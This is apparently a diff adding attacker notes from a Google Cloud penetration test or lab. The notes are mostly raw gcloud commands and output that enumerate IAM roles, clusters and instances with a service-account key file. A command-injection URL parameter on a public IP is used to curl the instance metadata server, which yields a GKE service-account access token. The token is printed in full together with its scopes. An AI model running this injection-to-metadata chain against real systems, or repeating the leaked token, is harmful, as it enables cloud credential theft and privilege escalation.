@@ -1,0 +1,56 @@
+PS C:\Users\Shade> gcloud auth activate-service-account ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com  --key-file="C:\Users\Shade\Downloads\694a8790693edc3ecc05fc26.json" --project=sonic-airfoil-339910
+
+gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"
+
+gcloud iam roles describe --project sonic-airfoil-339910
+
+gcloud iam roles describe yic2b6wr --project=sonic-airfoil-339910
+
+Automated : gcp_enum, gcp_scanner
+Mannual : gcloud cli
+
+gcloud container clusters list
+
+gcloud compute forwarding-rules list
+
+
+http://34.42.232.208/?cmd=curl%20http://169.254.169.254/computeMetadat
+a/v1/instance/service-accounts/default/email%20-H%20%22Metadata-Fla
+vor:Google%22
+
+
+http://34.42.232.208/?cmd=curl%20http://169.254.169.254/computeMetadat
+a/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/email%20-H%20%22Metadata-Flavor:Google%22
+
+http://34.42.232.208/?cmd=curl%20http://169.254.169.254/computeMetadat
+a/v1/instance/service-accounts/gke-service-account@sonic-airfoil-33991
+0.iam.gserviceaccount.com/token%20-H%20%22Metadata-Flavor:Google%22
+
+{"access_token":"ya29.c.c0AZ1aNiUAU4EI2iev7eDNvnc_A34LZvcVE48OxvybjDJZRU_v_iV4M93Ucnbe3f6fbzcQD6szxHtTtf8jAKpH6AIsE-Otd2c9duqCFd7To6nC3nIh9npjUvkbRNZTRCP2_72s8c1wmtZAxu1thSaKnd6P6LJGkA_FO9PStKiwWjhBBku8C1zzZNf4DTVTI9YUWFP2lG75MnNcIbXgiyVaHBF3EGpIV7Mx-BR92EziF9KYkE3d86ZqpRwkqqyemsWG5L9Nb5qc8ymQhdKFTYu3Mb_fYpelEz_snBFB9oOM2_bwPnyO3i4R0lJRbcUeW8spDq6j5I_jjwhQSRjH91a9jVV74N90QGuUqL8DK5_UyKQE3Y8x4awQ12FeWaW88-65pcmiIpjhwXfTqyNxVUtYGatLWAH419Die9qiodnzn1sxZl3vxiFtQfbW0QtJXSB-jmatIbFOguUbkpSMhxiurd5Wvl8h62n43_Wh4Va3FvgyrY5fBRMmOtuketdJYg3568su137Qi7QWcyzMV1wFnV46bWUxz6zuyVWQknfubQfXmgz8r7vpJ3a57qiBOc5VWRfIRg3bQ-oc28u0ylk4j_J4gMmiQB8ryt_BIj0ljtIOR92v4Bq8SSSfx09hdJlf8_SiS8Q2oq_hikOjd-2ztkxmzBkeiivV-hWbQ3hJdYn_WcklzrIaQJjszlQva3R02fUc0M_8pFgvnoUtzl7UX55_s_4VvBImaSsdM2za6_aaBg_8jvcZ4Bit7a5QsWF6_Oni3XW6Rxp9_4bwVrRscdee8qxZg44VbaB1hn7fo44ha_nOq-JnaRcuV-zu8FifBFMZBij38yQmSjucUhpI1MUImrrhIjtj0O2BY0SU50guirByuvmjQIZh4ktVJIFzhMRxkrVY8h-c7Xlb4U4v-flvSQWd7dlz4x0IXthVO2cO4pjkI9fh9WfQwMWx1dMU4FfkJcnZBFqj_uhdqUngk4dcwBp7ZuQrW4YffR71owSJk5mkuhzO76Z","expires_in":3230,"token_type":"Bearer"}
+
+http://34.42.232.208/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/in
+stance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gservic
+eaccount.com/scopes%20-H%20%22Metadata-Flavor:Google%22
+
+https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/monitoring
+
+curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.c.c0AZ1aNiUAU4EI2iev7eDNvnc_A34LZvcVE48OxvybjDJZRU_v_iV4M93Ucnbe3f6fbzcQD6szxHtTtf8jAKpH6AIsE-Otd2c9duqCFd7To6nC3nIh9npjUvkbRNZTRCP2_72s8c1wmtZAxu1thSaKnd6P6LJGkA_FO9PStKiwWjhBBku8C1zzZNf4DTVTI9YUWFP2lG75MnNcIbXgiyVaHBF3EGpIV7Mx-BR92EziF9KYkE3d86ZqpRwkqqyemsWG5L9Nb5qc8ymQhdKFTYu3Mb_fYpelEz_snBFB9oOM2_bwPnyO3i4R0lJRbcUeW8spDq6j5I_jjwhQSRjH91a9jVV74N90QGuUqL8DK5_UyKQE3Y8x4awQ12FeWaW88-65pcmiIpjhwXfTqyNxVUtYGatLWAH419Die9qiodnzn1sxZl3vxiFtQfbW0QtJXSB-jmatIbFOguUbkpSMhxiurd5Wvl8h62n43_Wh4Va3FvgyrY5fBRMmOtuketdJYg3568su137Qi7QWcyzMV1wFnV46bWUxz6zuyVWQknfubQfXmgz8r7vpJ3a57qiBOc5VWRfIRg3bQ-oc28u0ylk4j_J4gMmiQB8ryt_BIj0ljtIOR92v4Bq8SSSfx09hdJlf8_SiS8Q2oq_hikOjd-2ztkxmzBkeiivV-hWbQ3hJdYn_WcklzrIaQJjszlQva3R02fUc0M_8pFgvnoUtzl7UX55_s_4VvBImaSsdM2za6_aaBg_8jvcZ4Bit7a5QsWF6_Oni3XW6Rxp9_4bwVrRscdee8qxZg44VbaB1hn7fo44ha_nOq-JnaRcuV-zu8FifBFMZBij38yQmSjucUhpI1MUImrrhIjtj0O2BY0SU50guirByuvmjQIZh4ktVJIFzhMRxkrVY8h-c7Xlb4U4v-flvSQWd7dlz4x0IXthVO2cO4pjkI9fh9WfQwMWx1dMU4FfkJcnZBFqj_uhdqUngk4dcwBp7ZuQrW4YffR71owSJk5mkuhzO76Z
+
+{
+  "issued_to": "101512511373288595359",
+  "audience": "101512511373288595359",
+  "scope": "https://www.googleapis.com/auth/monitoring https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/compute",
+  "expires_in": 2561,
+  "access_type": "online"
+}
+
+gcloud compute instances list
+
+
+gcloud compute instances get-iam-policy tesing-instance --zone us-central1-b --flatten="bindings[].members" --filter="bindings.members=serviceaccount:gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"
+
+projects/sonic-airfoil-339910/roles/zklez1jh
+
+gcloud iam roles describe zklez1jh --project=sonic-airfoil-339910
+
+
